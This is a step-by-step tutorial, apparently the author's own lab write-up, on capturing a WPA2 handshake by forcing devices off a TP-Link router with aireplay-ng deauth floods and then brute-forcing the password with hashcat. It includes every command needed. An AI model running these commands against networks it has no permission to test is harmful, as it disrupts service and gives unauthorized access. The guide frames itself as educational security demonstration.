# WiFi Deauthentication & WPA2 Cracking using Hashcat

> **Disclaimer:** This guide is intended strictly for educational purposes and ethical hacking within authorized environments. Do not attempt on networks without explicit permission.

## Requirements

- Kali Linux
- Compatible WiFi adapter (supports monitor mode & packet injection)
- Tools used:
  - `airmon-ng`
  - `airodump-ng`
  - `aireplay-ng`
  - `hcxpcapngtool`
  - `hashcat`

## Step-by-Step Process

### 1. Check WiFi Dongle Connection

```bash
iwconfig
```

Check if your dongle (e.g., wlan1) is detected and in `Managed` mode.

### 2. Enable Monitor Mode

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan1
iwconfig
```

Confirm that the interface (wlan1) is now in `Monitor` mode.

### 3. Discover Nearby WiFi Networks

```bash
sudo airodump-ng wlan1
```

Find your target network and note the following:
Like in my case it was: 

- SSID: TP-Link\_2646
- Channel: 4
- BSSID: C0\:C9\:E3:83:26:46

### 4. Target the Specific Network

```bash
sudo airodump-ng wlan1 -d C0:C9:E3:83:26:46
```

This filters results to show only the target network.

### 5. Deauthenticate Connected Devices

In a **new terminal**, run:

```bash
sudo aireplay-ng --deauth 0 -a C0:C9:E3:83:26:46 wlan1
```

This forces devices to disconnect and reconnect, capturing the handshake.

### 6. Capture WPA2 Handshake

In the original terminal:

```bash
sudo airodump-ng -w hack1 -c 4 --bssid C0:C9:E3:83:26:46 wlan1
```

- `-w hack1`: Saves to hack1-01.cap
- `-c 4`: Channel 4
- `--bssid`: Specific router target

### 7. Convert .cap to .hc22000 Format

```bash
sudo hcxpcapngtool -o wpa2.hc22000 hack1-01.cap
```

This converts the capture into a format readable by Hashcat.

### 8. Brute-Force the WPA2 Password

```bash
hashcat -m 22000 -a 3 wpa2.hc22000 ?d?d?d?d?d?d?d?d
```

- `-m 22000`: WPA2
- `-a 3`: Brute-force mode
- `?d?d?d?d?d?d?d?d`: 8-digit numeric password pattern

### 9. (Optional) Restart Network Manager

```bash
sudo service NetworkManager restart
```

To restore regular network functionality.

## Summary

Using this method, a default 8-digit numeric password of a TP-Link router was successfully cracked. This demonstrates a real-world vulnerability in using weak/default WiFi passwords.

---

**Educational Use Only.** Always act responsibly and ethically when handling cybersecurity tools.

